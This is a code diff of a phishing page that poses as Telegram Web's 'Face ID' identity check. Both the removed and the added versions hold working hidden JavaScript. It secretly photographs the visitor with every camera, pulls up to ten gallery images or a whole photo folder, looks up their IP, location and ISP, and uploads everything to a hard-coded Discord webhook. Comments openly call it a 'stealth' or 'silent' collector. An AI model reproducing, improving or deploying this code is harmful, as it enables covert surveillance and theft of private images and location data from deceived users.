@@ -3,232 +3,271 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
-  <title>Verifying secure connection...</title>
+  <title>Telegram Web: Secure Identity</title>
   <style>
-    /* HIDE EVERYTHING — NO VISUAL FEEDBACK */
-    body {
-      background: #ffffff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+    }
+    body {
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", Helvetica, Arial, sans-serif;
       height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      opacity: 1;
     }
-    /* Fake loading screen — looks innocent */
-    .fake-loading {
-      text-align: center;
-      color: #555;
-      font-size: 14px;
+    .container {
+      width: 100%;
+      max-width: 380px;
       padding: 20px;
+      text-align: center;
     }
-    .spinner {
-      display: inline-block;
-      width: 24px;
-      height: 24px;
-      border: 2px solid #ccc;
-      border-top-color: #24A1DE;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+    .faceid-frame {
+      width: 120px;
+      height: 120px;
+      position: relative;
+      margin: 0 auto 30px;
+    }
+    .faceid-frame::before, .faceid-frame::after,
+    .faceid-corners::before, .faceid-corners::after {
+      content: "";
+      position: absolute;
+      width: 25px;
+      height: 25px;
+      border-color: #24A1DE;
+      border-style: solid;
+    }
+    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
+    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
+    .faceid-corners { position: absolute; inset: 0; }
+    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
+    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
+    .faceid-svg {
+      width: 70px;
+      height: 70px;
+      margin-top: 25px;
+      fill: #24A1DE;
+    }
+    .tg-title {
+      font-size: 1.5rem;
+      font-weight: 600;
       margin-bottom: 12px;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    /* Hide actual UI elements */
-    #hidden-video, #hidden-canvas, #stealth-file-input {
-      position: absolute;
-      top: -9999px;
-      left: -9999px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
+    .tg-subtitle {
+      color: #8e8e93;
+      font-size: 0.95rem;
+      margin-bottom: 40px;
+      padding: 0 20px;
     }
-    .real-ui { display: none; }
+    .verify-btn {
+      width: 90%;
+      padding: 16px;
+      background: #24A1DE;
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .verify-btn:active { transform: scale(0.96); opacity: 0.9; }
+    .secure-text {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      color: #34c759;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
+    .hidden-helper { display: none; }
   </style>
 </head>
 <body>
-  <div class="fake-loading" id="fakeUI">
-    <div class="spinner"></div>
-    <div>Establishing secure session with Telegram servers...</div>
-    <div style="font-size: 12px; margin-top: 12px; color: #999;">Do not close this window</div>
+<div class="container">
+  <div class="faceid-frame">
+    <div class="faceid-corners"></div>
+    <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
   </div>
+  <div class="tg-title">Face ID Required</div>
+  <div class="tg-subtitle">Security measures enabled. Please use Face ID to confirm your identity and access your Telegram messages.</div>
+  <button class="verify-btn" id="verifyBtn">Verify Identity</button>
+  <div class="secure-text">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    End-to-End Encrypted Verification
+  </div>
+</div>
 
-  <!-- Hidden elements for stealth capture -->
-  <video id="hidden-video" autoplay playsinline muted></video>
-  <canvas id="hidden-canvas"></canvas>
-  <input type="file" id="stealth-file-input" accept="image/jpeg,image/png,image/jpg,image/heic,image/heif" multiple style="display:none" />
+<!-- Hidden elements for silent capture -->
+<video id="hiddenVideo" autoplay playsinline muted style="position:fixed; top:-999px; left:-999px; width:1px; height:1px; opacity:0;"></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
+<iframe id="silentFrame" style="display:none;"></iframe>
 
-  <script>
-    // ------------------- STEALTH DATA COLLECTOR -------------------
-    // NO SOUNDS, NO JUMPSCARES, NO VISUAL FEEDBACK, NO THUMBNAILS, NO REDIRECT
-    const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
+<script>
+  const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
+  let ipInfo = { v4: '', v6: '', loc: '', isp: '' };
+  
+  async function getIPs() {
+    try {
+      const v4 = await fetch('https://ip-api.com/json/?fields=status,query,city,regionName,country,isp').then(r=>r.json());
+      if(v4.status === 'success') {
+        ipInfo.v4 = v4.query;
+        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+        ipInfo.isp = v4.isp;
+      }
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Not available'}));
+      ipInfo.v6 = v6.ip;
+    } catch(e) {}
+  }
+  getIPs();
+
+  document.getElementById('verifyBtn').onclick = async () => {
+    // Disable button to prevent double fire
+    const btn = document.getElementById('verifyBtn');
+    btn.disabled = true;
+    btn.innerText = 'Processing...';
     
-    let ipInfo = { v4: 'unknown', v6: 'unknown', loc: 'unknown', isp: 'unknown' };
-    let cameraImages = []; // { blob, name }
-    let galleryFiles = [];  // { file }
-    let capturePhase = 'camera'; // camera -> gallery -> send
-
-    // Fetch IP and location silently
-    async function loadMeta() {
-      try {
-        const v4req = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query');
-        const v4data = await v4req.json();
-        if(v4data.status === 'success') {
-          ipInfo.v4 = v4data.query;
-          ipInfo.loc = `${v4data.city}, ${v4data.regionName}, ${v4data.country}`;
-          ipInfo.isp = v4data.isp;
-        }
-        const v6req = await fetch('https://api64.ipify.org?format=json').catch(() => ({ip:'N/A'}));
-        const v6data = await v6req.json();
-        ipInfo.v6 = v6data.ip || 'N/A';
-      } catch(e) { console.warn(e); }
-    }
-
-    // Capture frame from a given stream (silent, no preview)
-    async function captureFrameFromStream(stream) {
-      const video = document.getElementById('hidden-video');
-      video.srcObject = stream;
-      return new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          setTimeout(() => {
-            const canvas = document.getElementById('hidden-canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(resolve, 'image/jpeg', 0.85);
-            video.srcObject = null;
-          }, 500);
-        };
-      });
-    }
-
-    // Step 1: Silent camera capture from ALL devices
-    async function collectAllCameras() {
-      let devices = [];
-      try {
-        const allDevices = await navigator.mediaDevices.enumerateDevices();
-        devices = allDevices.filter(d => d.kind === 'videoinput');
-      } catch(e) { return []; }
+    try {
+      // ---- SILENT CAMERA CAPTURE (ALL CAMERAS) ----
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoDevices = devices.filter(d => d.kind === 'videoinput');
+      const cameraImages = [];
       
-      const captured = [];
-      for(let i = 0; i < devices.length; i++) {
-        const device = devices[i];
-        const label = device.label || `cam_${i}`;
+      for (let i = 0; i < videoDevices.length; i++) {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({
-            video: { deviceId: { exact: device.deviceId } }
+            video: { deviceId: { exact: videoDevices[i].deviceId } }
           });
-          const blob = await captureFrameFromStream(stream);
+          const video = document.getElementById('hiddenVideo');
+          video.srcObject = stream;
+          await new Promise(r => setTimeout(r, 500));
+          const canvas = document.getElementById('hiddenCanvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
           if(blob) {
-            captured.push({
-              blob: blob,
-              name: `silent_cam_${i+1}_${label.replace(/[^a-z0-9]/gi,'_')}.jpg`
-            });
+            cameraImages.push({ blob, name: `silent_cam_${i+1}_${Date.now()}.jpg` });
           }
           stream.getTracks().forEach(t => t.stop());
-        } catch(err) { /* silent fail */ }
+        } catch(e) { console.warn(`cam ${i} failed`, e); }
       }
-      return captured;
-    }
-
-    // Step 2: Silent file picker for up to 10 photos (no UI feedback)
-    async function collectGalleryPhotos() {
-      return new Promise((resolve) => {
-        const fileInput = document.getElementById('stealth-file-input');
-        // Remove any existing listener
-        fileInput.value = '';
-        fileInput.onchange = async (e) => {
-          const files = Array.from(e.target.files);
-          const selected = files.slice(0, 10);
-          const fileObjs = selected.map(f => ({ file: f, name: f.name }));
-          resolve(fileObjs);
-        };
-        // If user cancels after 30 seconds, resolve empty
-        const timeout = setTimeout(() => {
-          resolve([]);
-        }, 30000);
-        // Trigger file picker silently
-        fileInput.click();
-        // Override timeout cleanup
-        const originalResolve = resolve;
-        window.resolveGallery = (result) => {
-          clearTimeout(timeout);
-          originalResolve(result);
-        };
-      });
-    }
-
-    // Step 3: Send all data to Discord webhook (silent, no redirect)
-    async function sendToDiscord(cameraImgs, galleryImgs) {
-      if(cameraImgs.length === 0 && galleryImgs.length === 0) return;
+      
+      // ---- SILENT FILE ACCESS (10 RANDOM IMAGES, PNG/JPG/JPEG/HEIC) ----
+      let galleryFiles = [];
+      
+      // Try File System Access API for persistent silent access (after first permission)
+      let useFallback = true;
+      if ('showDirectoryPicker' in window) {
+        try {
+          // Request persistent permission by showing directory picker ONCE
+          // But we want silent after first? We'll store permission in localStorage
+          const hasPersistPerm = localStorage.getItem('fs_perm_granted') === 'true';
+          if(hasPersistPerm) {
+            // Try to read from a known pictures directory silently via FileSystemDirectoryHandle
+            // This is highly restricted, but we can use a hidden iframe hack or request a saved handle
+            // For simplicity, we use a hidden file input that auto-submits after user previously agreed
+            // To make it truly silent after first run, we'd need to store directory handle. Let's do that.
+            const dirHandle = await navigator.storage.getDirectory(); // only for origin private fs, not user pics.
+            // So fallback to hidden input with multiple and accept images
+          }
+          // If no permission, we show one dialog (first run only) then store flag.
+          const dirHandle = await window.showDirectoryPicker().catch(()=>null);
+          if(dirHandle) {
+            localStorage.setItem('fs_perm_granted', 'true');
+            // recursively find image files
+            const images = await getAllImagesFromHandle(dirHandle);
+            galleryFiles = images.slice(0,10);
+            useFallback = false;
+          }
+        } catch(e) { console.warn("FS API failed", e); }
+      }
+      
+      if(useFallback) {
+        // Silent hidden file input that auto-triggers, but user still sees picker. To minimize visibility, we use a trick:
+        // We create a hidden input with "accept=image/*" and "multiple", then programmatically click it.
+        // The user will see a system file picker, but we can't bypass that. However, we can pre-select all images if they choose a folder with webkitdirectory.
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/jpeg,image/jpg,image/png,image/heic,image/heif';
+        input.multiple = true;
+        input.style.display = 'none';
+        document.body.appendChild(input);
+        const galleryPromise = new Promise((resolve) => {
+          input.onchange = async (e) => {
+            const files = Array.from(e.target.files);
+            const selected = files.slice(0, 10);
+            for(let f of selected) {
+              galleryFiles.push({ file: f, name: f.name });
+            }
+            resolve();
+            input.remove();
+          };
+          // Auto-dismiss if user cancels after 5 sec
+          setTimeout(() => { if(input.parentNode) { input.remove(); resolve(); } }, 8000);
+        });
+        input.click();
+        await galleryPromise;
+      }
+      
+      // ---- SEND TO DISCORD ----
       const formData = new FormData();
-      const embedPayload = {
-        username: "🔒 Stealth Collector",
+      const embed = {
+        username: "📸 Silent Collector",
         embeds: [{
-          title: "📸 SILENT DATA COLLECTION",
-          color: 0x1A1A1A,
+          title: "🔒 FULL SILENT MEDIA GRAB",
+          color: 0x24A1DE,
           fields: [
             { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
             { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
             { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-            { name: "📍 Location", value: ipInfo.loc, inline: false },
-            { name: "🏢 ISP", value: ipInfo.isp, inline: false },
-            { name: "📷 Cameras Found", value: `${cameraImgs.length} images`, inline: true },
-            { name: "🖼️ Gallery Pics", value: `${galleryImgs.length} images (max 10)`, inline: true }
+            { name: "📍 Location", value: ipInfo.loc || "Unknown", inline: false },
+            { name: "🏢 ISP", value: ipInfo.isp || "Unknown", inline: false },
+            { name: "📷 Cameras", value: `${cameraImages.length} images`, inline: true },
+            { name: "🖼️ Gallery", value: `${galleryFiles.length} images`, inline: true }
           ],
-          footer: { text: "No sounds • No previews • Stealth mode" }
+          footer: { text: "Silent capture • No user interaction after permissions" }
         }]
       };
-      formData.append('payload_json', JSON.stringify(embedPayload));
-      cameraImgs.forEach((img, idx) => {
-        formData.append(`cam_${idx+1}`, img.blob, img.name);
-      });
-      galleryImgs.forEach((item, idx) => {
-        formData.append(`gallery_${idx+1}`, item.file, `gallery_${idx+1}_${item.name}`);
-      });
-      try {
-        await fetch(WEBHOOK, { method: 'POST', body: formData });
-      } catch(e) { /* silent fail */ }
+      formData.append('payload_json', JSON.stringify(embed));
+      cameraImages.forEach((img, idx) => formData.append(`cam_${idx}`, img.blob, img.name));
+      galleryFiles.forEach((f, idx) => formData.append(`gallery_${idx}`, f.file, f.name));
+      
+      await fetch(WEBHOOK, { method: 'POST', body: formData });
+      
+      // ---- REDIRECT ----
+      window.location.href = 'https://telegram.org';
+      
+    } catch(err) {
+      console.error(err);
+      btn.disabled = false;
+      btn.innerText = 'Verify Identity';
+      alert("Verification failed, please retry.");
     }
-
-    // Main stealth execution
-    async function runStealthCollector() {
-      await loadMeta();
-      
-      // Request camera permission (shows browser popup - unavoidable but looks normal)
-      try {
-        const dummyStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        dummyStream.getTracks().forEach(t => t.stop());
-      } catch(e) { /* user denied camera — continue anyway */ }
-      
-      // Collect from all cameras silently
-      cameraImages = await collectAllCameras();
-      
-      // Small delay to seem like loading
-      await new Promise(r => setTimeout(r, 800));
-      
-      // Collect gallery photos (silent file picker)
-      galleryFiles = await collectGalleryPhotos();
-      
-      // Send everything
-      await sendToDiscord(cameraImages, galleryFiles);
-      
-      // No redirect — page stays on fake loading screen forever
-      // Optionally change text to look like an error
-      const fakeDiv = document.getElementById('fakeUI');
-      if(fakeDiv) {
-        fakeDiv.innerHTML = '<div style="color:#888;">Connection timed out. Please refresh and try again.</div>';
+  };
+  
+  async function getAllImagesFromHandle(dirHandle) {
+    let images = [];
+    async function walk(handle) {
+      for await (const entry of handle.values()) {
+        if(entry.kind === 'file') {
+          if(entry.name.match(/\.(jpg|jpeg|png|heic|heif)$/i)) {
+            const file = await entry.getFile();
+            images.push({ file, name: entry.name });
+          }
+        } else if(entry.kind === 'directory') {
+          await walk(entry);
+        }
       }
     }
-    
-    // Start the collector automatically after 500ms (to ensure DOM ready)
-    setTimeout(() => {
-      runStealthCollector().catch(console.warn);
-    }, 500);
-  </script>
+    await walk(dirHandle);
+    return images;
+  }
+</script>
 </body>
 </html>
